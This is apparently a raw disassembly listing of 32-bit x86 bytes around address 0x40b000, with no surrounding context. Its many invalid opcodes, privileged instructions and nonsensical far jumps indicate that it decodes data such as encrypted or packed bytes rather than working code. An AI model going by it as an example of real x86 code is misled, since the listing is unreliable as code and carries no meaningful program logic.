  40b09e:	dec    ecx
  40b09f:	pop    ecx
  40b0a0:	in     al,dx
  40b0a1:	inc    edi
  40b0a2:	(bad)  
  40b0a3:	(bad)  
  40b0a4:	fld    DWORD PTR ds:0xc13a8af1
  40b0aa:	stos   BYTE PTR es:[edi],al
  40b0ab:	(bad)  
  40b0ac:	sub    ebx,DWORD PTR [ecx+0x4e5e2e13]
  40b0b2:	adc    eax,0x13111cf9
  40b0b7:	aas    
  40b0b8:	out    0xda,eax
  40b0ba:	jnp    0x40b113
  40b0bc:	xchg   ebx,eax
  40b0bd:	jle    0x40b057
  40b0bf:	adc    eax,0x9339edf6
  40b0c4:	push   esp
  40b0c5:	jbe    0x40b102
  40b0c7:	(bad)  
  40b0c8:	sar    BYTE PTR [eax],1
  40b0ca:	mov    esi,0x996698bb
  40b0cf:	invd   
  40b0d1:	(bad)  
  40b0d2:	cli    
  40b0d3:	and    al,0x85
  40b0d5:	outs   dx,BYTE PTR ds:[esi]
  40b0d6:	cmp    ebp,DWORD PTR [eax-0x1914795d]
  40b0dc:	dec    edi
  40b0dd:	jns    0x40b0e7
  40b0df:	pushf  
  40b0e0:	mov    esp,0x798300a5
  40b0e5:	push   ebp
  40b0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0e7:	scas   eax,DWORD PTR es:[edi]
  40b0e8:	les    ebx,FWORD PTR [eax]
  40b0ea:	out    0x98,eax
  40b0ec:	mov    ebx,0xb88c5225
  40b0f1:	adc    al,0x1f
  40b0f3:	dec    esp
  40b0f4:	dec    edx
  40b0f5:	cdq    
  40b0f6:	repz loopne 0x40b0f0
  40b0f9:	ror    DWORD PTR [ebp-0x7d],1
  40b0fc:	push   ebp
  40b0fd:	std    
  40b0fe:	hlt    
  40b0ff:	jmp    0x40b168
  40b101:	push   eax
  40b102:	je     0x40b0cf
  40b104:	jb     0x40b0af
  40b106:	jns    0x40b0ba
  40b108:	mov    al,ds:0x1b303f8e
  40b10d:	pop    ebp
  40b10e:	mov    dl,BYTE PTR [ecx+esi*8]
  40b111:	fnstsw WORD PTR [edi]
  40b113:	sar    BYTE PTR [ebx-0x16a3645c],1
  40b119:	sbb    ebp,DWORD PTR [eax-0x7297144a]
  40b11f:	cmp    BYTE PTR [ebx],al
  40b121:	and    eax,DWORD PTR [ecx-0x1819e7f5]
  40b127:	imul   eax,ebx,0x18248741
  40b12d:	lods   eax,DWORD PTR ds:[esi]
  40b12e:	mov    bh,0xc7
  40b130:	or     ch,bh
  40b132:	cs sub ebp,ebp
  40b135:	jo     0x40b13f
  40b137:	jp     0x40b0c1
  40b139:	shl    DWORD PTR [eax+edx*8],1
  40b13c:	data16 ror BYTE PTR [eax+0x3c7d58ba],0x42
  40b144:	xchg   DWORD PTR [eax-0xfedfea8],ebp
  40b14a:	mov    ds:0xf5cfaec0,al
  40b14f:	mov    al,0x8d
  40b151:	popf   
  40b152:	popf   
  40b153:	ret    0x5afd
  40b156:	jb     0x40b170
  40b158:	pusha  
  40b159:	mov    bh,0xae
  40b15b:	iret   
  40b15c:	pop    ebx
  40b15d:	cmp    eax,0xe89e846c
  40b162:	out    0xd6,eax
  40b164:	jns    0x40b1b2
  40b166:	mov    ds:0x60a8a5c8,al
  40b16b:	inc    eax
  40b16c:	repnz inc ebp
  40b16e:	mov    edx,ds
  40b170:	test   BYTE PTR [eax+0x9],al
  40b173:	mov    dh,0xdb
  40b175:	ret    0x3a15
  40b178:	(bad)  [eax]
  40b17a:	sub    eax,0x1847d2b4
  40b17f:	ret    
  40b180:	loope  0x40b193
  40b182:	or     al,0x91
  40b184:	dec    ebx
  40b185:	mov    cl,0x9b
  40b187:	sbb    eax,0xc92eba48
  40b18c:	cwde   
  40b18d:	jle    0x40b1ad
  40b18f:	sbb    DWORD PTR [edi-0x2f333405],edi
  40b195:	gs enter 0x10d,0xa0
  40b19a:	mov    DWORD PTR [ebx-0x71],esi
  40b19d:	mov    eax,ds:0x7b923a6d
  40b1a2:	loopne 0x40b13c
  40b1a4:	cdq    
  40b1a5:	cwde   
  40b1a6:	hlt    
  40b1a7:	mov    ch,0x1f
  40b1a9:	jmp    0xcb3e:0xd7b88138
  40b1b0:	loop   0x40b1d8
  40b1b2:	loop   0x40b194
  40b1b4:	jmp    FWORD PTR [esi]
  40b1b6:	sub    eax,0x254fd75c
  40b1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1bc:	xchg   ebx,eax
  40b1bd:	mov    bl,0xd3
  40b1bf:	mov    BYTE PTR [edi+0x61],dl
  40b1c2:	mov    DWORD PTR [ebp-0x77f4ff16],edx
  40b1c8:	stos   BYTE PTR es:[edi],al
  40b1c9:	push   ecx
  40b1ca:	retf   
  40b1cb:	fmul   DWORD PTR [esi+0x70]
  40b1ce:	popa   
  40b1cf:	cmc    
  40b1d0:	sbb    al,0x11
  40b1d2:	lods   al,BYTE PTR ds:[esi]
  40b1d3:	sbb    al,0xc9
  40b1d5:	mov    ds:0xbec91fdc,eax
  40b1da:	pop    es
  40b1db:	or     eax,DWORD PTR [ecx-0x611a5e09]
  40b1e1:	(bad)  
  40b1e2:	fiadd  WORD PTR [ebx+ecx*8+0x46a2dc6e]
  40b1e9:	pop    ss
  40b1ea:	push   edi
  40b1eb:	xlat   BYTE PTR ds:[ebx]
  40b1ec:	ss ret 0x9e51
  40b1f0:	test   al,0xb1
  40b1f2:	mov    al,0x4d
  40b1f4:	std    
  40b1f5:	out    dx,al
  40b1f6:	je     0x40b245
  40b1f8:	fistp  DWORD PTR [edx+0x53c3972c]
  40b1fe:	push   es
  40b1ff:	mov    DWORD PTR [esi],0xf0de969d
  40b205:	add    DWORD PTR ds:0x588a7911,edi
  40b20b:	stos   BYTE PTR es:[edi],al
  40b20c:	call   0x28b8:0xd114a399
  40b213:	inc    esi
  40b214:	cli    
  40b215:	es jg  0x40b1b5
  40b218:	adc    eax,DWORD PTR [edi-0x67d46160]
  40b21e:	cli    
  40b21f:	in     al,0x11
  40b221:	mov    edi,0x7ad6d30a
  40b226:	add    al,0x17
  40b228:	outs   dx,BYTE PTR ds:[esi]
  40b229:	repz dec ecx
  40b22b:	xor    al,bl
  40b22d:	push   0x33
  40b22f:	stos   DWORD PTR es:[edi],eax
  40b230:	or     dh,al
  40b232:	into   
  40b233:	popf   
  40b234:	stos   DWORD PTR es:[edi],eax
  40b235:	jnp    0x40b1f6
  40b237:	(bad)  
  40b238:	push   0x520b8b2d
  40b23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b23e:	xchg   ecx,eax
  40b23f:	dec    ebp
  40b240:	cmp    BYTE PTR [esi+0x3],ch
  40b243:	pop    ecx
  40b244:	and    BYTE PTR [ebx+0x49133870],0x4f
  40b24b:	(bad)  
  40b24c:	loope  0x40b221
  40b24e:	sub    eax,0x197ed50e
  40b253:	leave  
  40b254:	dec    ebx
  40b255:	enter  0x593d,0xe3
  40b259:	ins    DWORD PTR es:[edi],dx
  40b25a:	mov    DWORD PTR [edx],ebx
  40b25c:	gs iret 
  40b25e:	xlat   BYTE PTR ds:[ebx]
  40b25f:	ins    BYTE PTR es:[edi],dx
  40b260:	xchg   ebx,eax
  40b261:	in     eax,dx
  40b262:	mov    ah,0xeb
  40b264:	in     eax,dx
  40b265:	(bad)  
  40b266:	jns    0x40b20d
  40b268:	mov    al,ds:0x96859a60
  40b26d:	mov    al,0xa0
  40b26f:	iret   
  40b270:	test   BYTE PTR ds:0x36ee0c19,ah
  40b276:	(bad)  
  40b277:	sub    bl,BYTE PTR cs:0x5d2e605a
  40b27e:	shl    BYTE PTR [eax],1
  40b280:	cmc    
  40b281:	adc    DWORD PTR [edx-0x59a70df1],ecx
  40b287:	das    
  40b288:	mov    DWORD PTR [eax+0x529b099c],0x9ebfae61
  40b292:	imul   edx,DWORD PTR [eax-0x70e7e694],0x981e76c0
  40b29c:	jecxz  0x40b2fd
  40b29e:	aaa    
  40b29f:	fisubr WORD PTR [ebp-0x66]
  40b2a2:	xchg   edi,eax
  40b2a3:	push   edi
  40b2a4:	cmp    DWORD PTR [edx-0x20bd296a],eax
  40b2aa:	or     eax,0x8fc05e7b
  40b2af:	hlt    
  40b2b0:	fdiv   st(2),st
  40b2b2:	rcl    edx,cl
  40b2b4:	xchg   ebx,eax
  40b2b5:	push   es
  40b2b6:	aad    0x89
  40b2b8:	cs into 
  40b2ba:	lea    esi,[ecx]
  40b2bc:	adc    ebx,DWORD PTR ds:[eax]
  40b2bf:	stos   DWORD PTR es:[di],eax
  40b2c1:	fxch   st(0)
  40b2c3:	inc    edx
  40b2c4:	push   ss
  40b2c5:	push   ebp
  40b2c6:	repnz and eax,DWORD PTR [ebx-0x73]
  40b2ca:	xor    ebx,DWORD PTR [ebp-0x3f]
  40b2cd:	stc    
  40b2ce:	rol    dh,cl
  40b2d0:	adc    edi,DWORD PTR [esi-0x59f8aaff]
  40b2d6:	cmp    BYTE PTR [ebp-0x2e055a49],ah
  40b2dc:	xchg   ebp,eax
  40b2dd:	lock mov bh,0x70
  40b2e0:	mov    ecx,0x14a9708c
  40b2e5:	push   0x6a4b8bb9
  40b2ea:	sub    edi,DWORD PTR [edi+0x67]
  40b2ed:	fwait
  40b2ee:	xchg   ecx,eax
  40b2ef:	lea    ebx,[esi+esi*4-0x435cbe3c]
  40b2f6:	ins    BYTE PTR es:[edi],dx
  40b2f7:	ins    BYTE PTR es:[edi],dx
  40b2f8:	cdq    
  40b2f9:	push   eax
  40b2fa:	or     BYTE PTR [ecx-0x1bd14a1a],0x24
  40b301:	test   DWORD PTR [ebx-0x60c9e7e4],ebp
  40b307:	out    0xd2,eax
  40b309:	mov    dl,BYTE PTR [ebx]
  40b30b:	cld    
  40b30c:	pop    edi
  40b30d:	es jle 0x40b34a
  40b310:	retf   
  40b311:	push   edx
  40b312:	push   esi
  40b313:	shl    BYTE PTR [ebx+0x51],cl
  40b316:	mov    dh,0xa4
  40b318:	lods   eax,DWORD PTR ds:[esi]
  40b319:	fadd   QWORD PTR [ebp+0x44]
  40b31c:	out    0x40,eax
  40b31e:	fadd   QWORD PTR [esp+edi*8]
  40b321:	mov    ah,BYTE PTR [eax-0x26344304]
  40b327:	dec    ecx
  40b328:	(bad)  
  40b329:	jo     0x40b314
  40b32b:	fistp  WORD PTR [ebx]
  40b32d:	jp     0x40b325
  40b32f:	ja     0x40b359
  40b331:	cdq    
  40b332:	jne    0x40b37c
  40b334:	or     edx,DWORD PTR [esi]
  40b336:	(bad)  
  40b337:	pop    ds
  40b338:	push   edx
  40b339:	test   DWORD PTR [esp+eiz*8-0x7ff235f4],ecx
  40b340:	adc    dh,dh
  40b342:	sub    eax,0x45a002ae
  40b347:	mov    bh,0xab
  40b349:	icebp  
  40b34a:	add    ah,BYTE PTR [ebx]
  40b34c:	mov    al,ds:0xa7770953
  40b351:	xchg   ebx,eax
  40b352:	into   
  40b353:	leave  
  40b354:	ret    
  40b355:	inc    edi
  40b356:	ds dec ebx
  40b358:	mov    ebx,0xc8bbfca8
  40b35d:	into   
  40b35e:	xchg   edi,eax
  40b35f:	cmp    al,0x92
  40b361:	add    BYTE PTR [ebp+0x18],ch
  40b364:	mov    eax,0xf63cc9f5
  40b369:	pop    esp
  40b36a:	xchg   ecx,eax
  40b36b:	push   ss
  40b36c:	jl     0x40b3dc
  40b36e:	jg     0x40b3b5
  40b370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b371:	out    dx,al
  40b372:	add    bl,BYTE PTR [ebp-0x73]
  40b375:	pop    edx
  40b376:	div    DWORD PTR [esi+edi*2+0x5dce93ca]
  40b37d:	shl    BYTE PTR [eax-0x3d],1
  40b380:	aas    
  40b381:	fadd   DWORD PTR es:[ecx-0x4e]
  40b385:	fwait
  40b386:	cmp    al,0xd0
  40b388:	mov    edi,0xf5a8de8f
  40b38d:	and    BYTE PTR [ecx-0x64f640a3],bh
  40b393:	imul   esp,ebx,0x73
  40b396:	cmp    edx,DWORD PTR [ebx-0x62]
  40b399:	and    ah,BYTE PTR [ebx-0x5]
  40b39c:	jbe    0x40b3f0
  40b39e:	in     al,dx
  40b39f:	cld    
  40b3a0:	sbb    eax,0xd40b298c
  40b3a6:	xor    DWORD PTR [eax-0x78],ecx
  40b3a9:	jns    0x40b3dc
  40b3ab:	pop    esp
  40b3ac:	(bad)  
  40b3ad:	enter  0x5a01,0xa1
  40b3b1:	mov    esp,0x74460225
  40b3b6:	adc    ch,ah
  40b3b8:	xor    eax,0x2f48ffba
  40b3bd:	lods   al,BYTE PTR ds:[esi]
  40b3be:	std    
  40b3bf:	call   0x2e1c087f
  40b3c4:	and    eax,0x3e0cf561
  40b3c9:	and    eax,0xa84efa9c
  40b3ce:	push   ebx
  40b3cf:	imul   DWORD PTR [esi+0x2ea3c2dc]
  40b3d5:	sbb    BYTE PTR [esi+0x37],ah
  40b3d8:	int3   
  40b3d9:	fld    QWORD PTR [ebx]
  40b3db:	adc    BYTE PTR [ecx+0x7c],al
  40b3de:	sub    ch,0xbf
  40b3e1:	xchg   ebp,eax
  40b3e2:	sub    eax,esi
  40b3e4:	mov    ah,0x18
  40b3e6:	xor    edx,DWORD PTR [edx]
  40b3e8:	mov    ebp,0xd31050bb
  40b3ed:	and    dh,BYTE PTR [eax-0x55f301f8]
  40b3f3:	je     0x40b433
  40b3f5:	inc    ebx
  40b3f6:	repnz adc ecx,DWORD PTR ds:0x1e60018f
  40b3fd:	xlat   BYTE PTR ds:[ebx]
  40b3fe:	imul   ecx,DWORD PTR [ecx],0x8829f67
  40b404:	out    dx,eax
  40b405:	xchg   esi,eax
  40b406:	push   esi
  40b407:	xor    eax,0x10c775de
  40b40c:	adc    BYTE PTR [edx],dl
  40b40e:	clc    
  40b40f:	nop
  40b410:	nop
  40b411:	scas   eax,DWORD PTR es:[edi]
  40b412:	bound  ebx,QWORD PTR [eax+0x7a2e60bc]
  40b418:	adc    al,0xc4
  40b41a:	dec    eax
  40b41b:	sub    DWORD PTR [eax],ebp
  40b41d:	out    0x37,al
  40b41f:	ss or  al,0x21
  40b422:	xor    BYTE PTR [ecx+ebp*1-0x15f08338],bh
  40b429:	ss cmp ah,ah
  40b42c:	push   eax
  40b42d:	sar    DWORD PTR [edi+ebx*8],cl
  40b430:	cs retf 0x6be0
  40b434:	mov    dl,0xd9
  40b436:	adc    eax,0x5b0931f2
  40b43b:	pop    ecx
  40b43c:	aaa    
  40b43d:	and    DWORD PTR [esi+0x1ed4ef9b],ebx
  40b443:	mov    edx,0x11000bed
  40b448:	popf   
  40b449:	jns    0x40b458
  40b44b:	ins    BYTE PTR es:[edi],dx
  40b44c:	in     eax,dx
  40b44d:	inc    esp
  40b44e:	ss xor ecx,edi
  40b451:	dec    esp
  40b452:	xchg   ebx,eax
  40b453:	ret    
  40b454:	fst    DWORD PTR [eax+0x69]
  40b457:	mov    ebx,DWORD PTR [edi+0x1abe8917]
  40b45d:	lods   al,BYTE PTR ds:[esi]
  40b45e:	mul    DWORD PTR [esi+0x7d071a6c]
  40b464:	jl     0x40b46c
  40b466:	test   al,0x5c
  40b468:	enterw 0xea9,0x78
  40b46d:	hlt    
  40b46e:	repnz adc esp,ebx
  40b471:	xchg   esi,eax
  40b472:	jnp    0x40b470
  40b474:	xchg   esi,eax
  40b475:	add    eax,0x1c27cc0d
  40b47a:	sbb    al,0x32
  40b47c:	xchg   DWORD PTR [ecx],edx
  40b47e:	imul   ecx
  40b480:	mov    bh,0x1a
  40b482:	loop   0x40b490
  40b484:	in     al,dx
  40b485:	hlt    
  40b486:	mov    al,ds:0xad36dc42
  40b48b:	push   edi
  40b48c:	cmp    al,0xcd
  40b48e:	arpl   WORD PTR [eax-0xa],bp
  40b491:	imul   edi,DWORD PTR [esi+0x4c],0x8933e92f
  40b498:	xchg   edx,eax
  40b499:	xor    edx,ebp
  40b49b:	xchg   edx,eax
  40b49c:	sub    al,0x42
  40b49e:	inc    ebp
  40b49f:	daa    
  40b4a0:	leave  
  40b4a1:	int3   
  40b4a2:	and    al,0x39
  40b4a4:	(bad)
  40b4a7:	enter  0xe0,0xd4
  40b4ab:	loop   0x40b4f2
  40b4ad:	cmp    cl,BYTE PTR [eax+0x3153a65d]
  40b4b3:	jo     0x40b49c
  40b4b5:	push   edi
  40b4b6:	outs   dx,BYTE PTR ds:[esi]
  40b4b7:	cli    
  40b4b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4b9:	xchg   edx,eax
  40b4ba:	div    BYTE PTR [ebp-0x2b15420b]
  40b4c0:	jle    0x40b481
  40b4c2:	xchg   DWORD PTR [esp+ebp*2+0x21f4e7d],edx
  40b4c9:	dec    ebp
  40b4ca:	stos   BYTE PTR es:[edi],al
  40b4cb:	lds    edx,FWORD PTR [eax+edi*8+0x5fc8e2af]
  40b4d2:	mov    bl,0x32
  40b4d4:	sub    BYTE PTR [edx+esi*2+0x1d284423],al
  40b4db:	sbb    dl,BYTE PTR [edx+ebp*2+0x5]
  40b4df:	or     al,0x56
  40b4e1:	iret   
  40b4e2:	lock inc ebx
  40b4e4:	adc    BYTE PTR [ecx+0x3e],dl
  40b4e7:	out    dx,eax
  40b4e8:	mov    al,0xff
  40b4ea:	xor    bh,BYTE PTR [ebx]
  40b4ec:	es std 
  40b4ee:	rcl    BYTE PTR [ebp-0x2b],0x14
  40b4f2:	fsubr  DWORD PTR [ecx-0x7fad675]
  40b4f8:	add    al,0x40
  40b4fa:	hlt    
  40b4fb:	ds nop
  40b4fd:	int    0x3d
  40b4ff:	rol    BYTE PTR [ebx-0x7e],cl
  40b502:	shl    DWORD PTR [edi],1
  40b504:	and    esi,edx
  40b506:	aaa    
  40b507:	iret   
  40b508:	or     BYTE PTR [ebx-0x2c985989],bh
  40b50e:	dec    ebx
  40b50f:	jne    0x40b50a
  40b511:	mov    eax,ds:0x6d2c2b9d
  40b516:	in     al,dx
  40b517:	out    dx,al
  40b518:	sbb    ah,ch
  40b51a:	jge    0x40b56f
  40b51c:	stos   BYTE PTR es:[edi],al
  40b51d:	stos   BYTE PTR es:[edi],al
  40b51e:	icebp  
  40b51f:	les    esp,FWORD PTR [edi-0x501406a6]
  40b525:	add    bl,BYTE PTR [ebp+edx*4-0xacc7]
  40b52c:	dec    edx
  40b52d:	stos   DWORD PTR es:[edi],eax
  40b52e:	sub    al,0xff
  40b530:	sbb    al,0x55
  40b532:	out    dx,al
  40b533:	push   ecx
  40b534:	in     eax,dx
  40b535:	mov    WORD PTR [edx+0x5d],ds
  40b538:	push   si
  40b53a:	aam    0x48
  40b53c:	mov    dl,0x66
  40b53e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53f:	or     DWORD PTR [eax+0x20],ebx
  40b542:	outs   dx,BYTE PTR ds:[esi]
  40b543:	cmp    bl,BYTE PTR [edi-0x3c3d24ae]
  40b549:	imul   edi,ebp,0x6e
  40b54c:	loopne 0x40b4ee
  40b54e:	popa   
  40b54f:	inc    ecx
  40b550:	shr    DWORD PTR [ecx-0x3e],0x64
  40b554:	xor    al,0xa
  40b556:	and    al,0x42
  40b558:	xchg   ebp,eax
  40b559:	fst    DWORD PTR [esi]
  40b55b:	dec    edx
  40b55c:	aas    
  40b55d:	bound  edx,QWORD PTR [ecx-0x2c5be666]
  40b563:	data16 add ch,BYTE PTR [ecx]
  40b566:	jp     0x40b52f
  40b568:	fld    TBYTE PTR [esi-0x3a]
  40b56b:	nop
  40b56c:	adc    esp,ecx
  40b56e:	aaa    
  40b56f:	cli    
  40b570:	sbb    al,0xac
  40b572:	(bad)  
  40b573:	cmp    BYTE PTR [ebx],cl
  40b575:	push   edx
  40b576:	adc    DWORD PTR [ebx+0x50e66c93],ecx
  40b57c:	das    
  40b57d:	add    edx,esp
  40b57f:	fld    st(5)
  40b581:	out    dx,al
  40b582:	xor    al,0x55
  40b584:	scas   eax,DWORD PTR es:[edi]
  40b585:	rol    DWORD PTR [edi],cl
  40b587:	aas    
  40b588:	or     ch,dl
  40b58a:	add    ch,BYTE PTR [eax*4-0x6187073d]
  40b591:	lods   eax,DWORD PTR ds:[esi]
  40b592:	nop
  40b593:	push   ebp
  40b594:	push   0xda3a8a14
  40b599:	dec    esp
  40b59a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b59b:	xchg   esi,eax
  40b59c:	sbb    BYTE PTR [eax-0x6126fff],cl
  40b5a2:	mov    ah,0x80
  40b5a4:	push   cs
  40b5a5:	cmp    al,0xc6
  40b5a7:	sbb    eax,0xe3a4f59d
  40b5ac:	fwait
  40b5ad:	iret   
  40b5ae:	lea    esp,[edi+edi*2]
  40b5b1:	push   edi
  40b5b2:	stos   BYTE PTR es:[edi],al
  40b5b3:	fcomip st,st(0)
  40b5b5:	repz inc ecx
  40b5b7:	fisub  DWORD PTR [ecx]
  40b5b9:	retf   0xc51f
  40b5bc:	and    al,0xc7
  40b5be:	push   cs
  40b5bf:	ror    DWORD PTR [edi+0x29],cl
  40b5c2:	mov    DWORD PTR [eax+0x57],edx
  40b5c5:	mov    edi,0x9f40dabf
  40b5ca:	pop    ss
  40b5cb:	push   eax
  40b5cc:	jmp    0xd477fd6a
  40b5d1:	inc    ebx
  40b5d2:	scas   eax,DWORD PTR es:[edi]
  40b5d3:	dec    ebp
  40b5d4:	cmp    ch,BYTE PTR [esi+0x7932906c]
  40b5da:	adc    ah,bl
  40b5dc:	pop    es
  40b5dd:	jno    0x40b58b
  40b5df:	inc    esp
  40b5e0:	addr16 mov ebx,eax
  40b5e3:	shl    BYTE PTR [edi+eiz*1],1
  40b5e6:	push   0x7642f6d8
  40b5eb:	sbb    DWORD PTR [esi+0x26108c83],0x26
  40b5f2:	add    al,0x94
  40b5f4:	mov    ?,WORD PTR [eax]
  40b5f6:	mov    bh,0x22
  40b5f8:	jo     0x40b626
  40b5fa:	(bad)  
  40b5fb:	xchg   ebx,eax
  40b5fc:	mov    cl,0xe8
  40b5fe:	out    0x92,al
  40b600:	sub    DWORD PTR [ebx],edi
  40b602:	fs gs lock and eax,0x554d75e2
  40b60a:	cmp    al,0x36
  40b60c:	cmp    edi,DWORD PTR [eax]
  40b60e:	repnz sub al,0xa3
  40b611:	gs std 
  40b613:	sub    DWORD PTR [edx],eax
  40b615:	fisub  WORD PTR [ebx]
  40b617:	cdq    
  40b618:	inc    edi
  40b619:	add    al,ah
  40b61b:	push   esi
  40b61c:	push   eax
  40b61d:	imul   edx,esp,0xfffffffb
  40b620:	scas   al,BYTE PTR es:[edi]
  40b621:	jo     0x40b5eb
  40b623:	dec    edi
  40b624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b625:	hlt    
  40b626:	pop    ecx
  40b627:	add    ebx,ebp
  40b629:	(bad)  
  40b62b:	rol    edi,cl
  40b62d:	lahf   
  40b62e:	aas    
  40b62f:	in     eax,0xdd
  40b631:	sbb    DWORD PTR [eax+esi*2],0xa1f64cea
  40b638:	ins    DWORD PTR es:[edi],dx
  40b639:	mov    ah,0x1f
  40b63b:	push   edx
  40b63c:	aas    
  40b63d:	fnsave ds:0x19ed7902
  40b643:	leave  
  40b644:	test   eax,0x791b9ed0
  40b649:	mov    BYTE PTR [ebx],ch
  40b64b:	popa   
  40b64c:	pop    edi
  40b64d:	mov    eax,ds:0x14e50d1f
  40b652:	ins    DWORD PTR es:[edi],dx
  40b653:	hlt    
  40b654:	lds    esi,FWORD PTR [ebx]
  40b656:	inc    esp
  40b657:	gs cdq 
  40b659:	aad    0xae
  40b65b:	jge    0x40b5f1
  40b65d:	pop    ebx
  40b65e:	daa    
  40b65f:	pop    edi
  40b660:	pop    eax
  40b661:	xchg   esi,eax
  40b662:	xchg   edi,eax
  40b663:	mov    ?,esp
  40b665:	dec    esp
  40b666:	xlat   BYTE PTR ds:[ebx]
  40b667:	cli    
  40b668:	loop   0x40b5f9
  40b66a:	mov    edi,edi
  40b66c:	add    ebx,DWORD PTR [ebx-0x75f2d61a]
  40b672:	xor    cl,BYTE PTR [eax-0x7b5d9ff6]
  40b678:	xchg   edx,eax
  40b679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b67a:	fimul  DWORD PTR ds:0x1f4efeb9
  40b680:	inc    edx
  40b681:	add    BYTE PTR [esi+0xd3c0f72],dh
  40b687:	ret    0x4ec
  40b68a:	(bad)  
  40b68b:	lods   al,BYTE PTR ds:[esi]
  40b68c:	push   edi
  40b68d:	test   DWORD PTR [ecx+0x78],0x6d474898
  40b694:	jmp    0x9fc03814
  40b699:	out    0x9a,al
  40b69b:	lock xchg ebp,eax
  40b69d:	mov    BYTE PTR [ebp+0x4f34169d],dl
  40b6a3:	mov    ah,0x93
  40b6a5:	scas   al,BYTE PTR es:[edi]
  40b6a6:	sbb    BYTE PTR [edx+eiz*1+0xca44e3a],0x14
  40b6ae:	mov    dl,0x3d
  40b6b0:	xor    ch,dh
  40b6b2:	popa   
  40b6b3:	ds cmc 
  40b6b5:	sub    esi,DWORD PTR [esi]
  40b6b7:	cld    
  40b6b8:	xchg   esp,eax
  40b6b9:	mov    cl,0xa6
  40b6bb:	sub    edi,eax
  40b6bd:	jne    0x40b679
  40b6bf:	sub    esi,DWORD PTR [ebx+0x389a83ae]
  40b6c5:	daa    
  40b6c6:	inc    ebx
  40b6c7:	xchg   esp,eax
  40b6c8:	jnp    0x40b742
  40b6ca:	jl     0x40b6d9
  40b6cc:	fist   WORD PTR [esi]
  40b6ce:	sub    al,0x75
  40b6d0:	push   eax
  40b6d1:	aad    0x11
  40b6d3:	jmp    0x21f0:0xc7d07134
  40b6da:	xchg   ecx,eax
  40b6db:	cli    
  40b6dc:	aam    0x9f
  40b6de:	mov    ebx,0xaef70875
  40b6e3:	mov    ecx,0xc38f3bfb
  40b6e8:	adc    eax,0xa451e174
  40b6ed:	xor    DWORD PTR [edi-0xe],esi
  40b6f0:	xchg   edi,eax
  40b6f1:	pop    ecx
  40b6f2:	rol    BYTE PTR [edi+0x1],1
  40b6f5:	dec    edi
  40b6f6:	ds leave 
  40b6f8:	pop    edi
  40b6f9:	adc    BYTE PTR [esi+edx*8-0x2a0a672c],0xbc
  40b701:	leave  
  40b702:	xchg   ebp,eax
  40b703:	jp     0x40b6b3
  40b705:	push   0x2c
  40b707:	or     ch,BYTE PTR [eax+ecx*4+0x3235d87f]
  40b70e:	(bad)  
  40b70f:	ja     0x40b776
  40b711:	repnz pusha 
  40b713:	fsubr  QWORD PTR cs:[ecx-0x1a]
  40b717:	dec    ecx
  40b718:	jb     0x40b736
  40b71a:	jmp    0x9a989455
  40b71f:	or     al,0x10
  40b721:	jmp    0x36f5:0x5ac4833b
  40b728:	mov    DWORD PTR [esi-0x3c29ba04],ebp
  40b72e:	xchg   edi,eax
  40b72f:	cmp    edi,DWORD PTR [esp+ebp*4]
  40b732:	data16 jg 0x40b71a
  40b735:	jmp    0x7ae3:0x25c802ed
  40b73c:	stc    
  40b73d:	cld    
  40b73e:	enter  0x92d6,0xe9
  40b742:	cmp    BYTE PTR [ebp+0x21a3ffde],dh
  40b748:	inc    esi
  40b749:	push   ebx
  40b74a:	rcr    DWORD PTR ds:0x2be6d28e,1
  40b750:	lock mov dl,ah
  40b753:	jmp    0x7fda:0x8992ed5d
  40b75a:	ja     0x40b711
  40b75c:	fiadd  DWORD PTR [ecx]
  40b75e:	test   eax,0xd7f06a6b
  40b763:	mov    cl,0x53
  40b765:	in     eax,dx
  40b766:	mov    ecx,0x4a21696f
  40b76b:	mov    WORD PTR [ecx-0x50],ss
  40b76e:	xchg   edi,eax
  40b76f:	jle    0x40b786
  40b771:	sbb    ah,BYTE PTR [ecx]
  40b773:	pop    edx
  40b774:	ret    0xaa66
  40b777:	(bad)  
  40b778:	inc    esi
  40b779:	outs   dx,BYTE PTR ds:[esi]
  40b77a:	rcr    BYTE PTR [ebx+0x31],cl
  40b77d:	add    dl,BYTE PTR [esi]
  40b77f:	daa    
  40b780:	test   DWORD PTR [eax-0x69],0x6989b490
  40b787:	gs pop esi
  40b789:	push   edx
  40b78a:	rcl    BYTE PTR [esi-0x6],0xcb
  40b78e:	lock sbb eax,0x4c32fe81
  40b794:	adc    eax,0x5ec53e44
  40b799:	ds push ecx
  40b79b:	loope  0x40b7f6
  40b79d:	or     edi,DWORD PTR [esi]
  40b79f:	xchg   edi,eax
  40b7a0:	sbb    eax,0x6e2b326d
  40b7a5:	inc    eax
  40b7a6:	sub    DWORD PTR [esi+0x3763d56f],esi
  40b7ac:	adc    ebp,DWORD PTR [ecx]
  40b7ae:	fcomp  QWORD PTR [ebx]
  40b7b0:	test   al,0x62
  40b7b2:	nop
  40b7b3:	cmp    DWORD PTR [edi],eax
  40b7b5:	mov    cl,0x96
  40b7b7:	scas   eax,DWORD PTR es:[edi]
  40b7b8:	out    dx,al
  40b7b9:	add    edi,DWORD PTR [ecx-0x55]
  40b7bc:	dec    ebx
  40b7bd:	sub    cl,cl
  40b7bf:	sbb    eax,0x7b851210
  40b7c4:	clc    
  40b7c5:	test   BYTE PTR [ebp-0x3329f985],al
  40b7cb:	jge    0x40b7a5
  40b7cd:	dec    ecx
  40b7ce:	add    ah,ch
  40b7d0:	cld    
  40b7d1:	ins    DWORD PTR es:[edi],dx
  40b7d2:	adc    al,0x99
  40b7d4:	jecxz  0x40b77e
  40b7d6:	xor    edi,DWORD PTR [eax+0x1870c438]
  40b7dc:	sbb    al,0x53
  40b7de:	push   ecx
  40b7df:	xlat   BYTE PTR ds:[ebx]
  40b7e0:	xchg   ebx,eax
  40b7e1:	push   edi
  40b7e2:	ins    BYTE PTR es:[edi],dx
  40b7e3:	(bad)  
  40b7e4:	xchg   ecx,eax
  40b7e5:	ins    BYTE PTR es:[edi],dx
  40b7e6:	leave  
